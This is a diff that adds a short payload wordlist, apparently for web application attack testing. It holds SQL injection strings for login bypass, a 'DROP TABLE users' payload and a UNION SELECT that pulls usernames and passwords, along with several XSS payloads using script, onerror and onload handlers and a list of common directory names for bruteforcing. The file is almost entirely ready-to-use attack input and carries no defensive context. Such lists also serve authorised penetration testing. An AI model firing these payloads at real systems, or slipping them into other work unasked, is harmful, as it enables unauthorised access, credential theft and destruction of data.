@@ -1,0 +1,39 @@
+# SQL Injection
+' OR 1=1 --
+' OR 'a'='a
+' OR ''='
+'; DROP TABLE users; --
+' OR '1'='1' --
+' OR '1'='1' ({
+' OR '1'='1' /*
+' OR 1=1#
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or ('1'='1--
+') or ('1'='1#
+') or ('1'='1/*
+admin') or ('1'='1--
+admin') or ('1'='1#
+admin') or ('1'='1/*
+' UNION SELECT null, null, null --
+' UNION SELECT username, password FROM users --
+
+# XSS
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><body onload=alert('XSS')>
+"><iframe src="javascript:alert('XSS')">
+
+# Directory Bruteforcing
+admin
+login
+test
+dashboard
+config
+setup
